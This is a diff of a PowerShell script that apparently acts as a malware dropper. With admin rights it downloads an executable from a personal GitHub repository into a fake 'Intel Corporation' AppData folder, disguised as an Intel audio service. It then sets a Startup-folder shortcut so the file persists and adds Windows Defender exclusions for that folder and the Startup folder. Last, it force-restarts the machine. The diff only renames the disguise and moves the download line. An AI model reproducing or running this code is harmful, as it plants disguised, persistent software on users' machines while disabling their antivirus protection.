@@ -9,27 +9,26 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
      }
      
      # Remainder of script here
-      if (! (test-path -PathType container "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service")) {
-            New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
-      }
-      Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/IntelAudIOSvc.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudIOSvc.exe"  
+
 
       $WScriptShell = New-Object -ComObject WScript.Shell
       $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-      $ShortcutFile = "$FolderPath\IntelAudIOSvc.lnk"
-      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudIOSvc.exe"
+      $ShortcutFile = "$FolderPath\IAAudIOSvc.lnk"
+      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe"
       
       If(!(Test-Path $FolderPath)) {
           New-Item -ItemType Directory -Force -Path $FolderPath
       }
+
+      Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/IAAudIOSvc.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe"  
       
       $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
       $Shortcut.TargetPath = $TargetFile
       $Shortcut.Arguments = ""
-      $Shortcut.WorkingDirectory = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
-      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudIOSvc.exe,0"
+      $Shortcut.WorkingDirectory = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc"
+      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe,0"
       $Shortcut.Save()
 
-      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\"
+      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\"
       Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" 
       Restart-Computer -Force
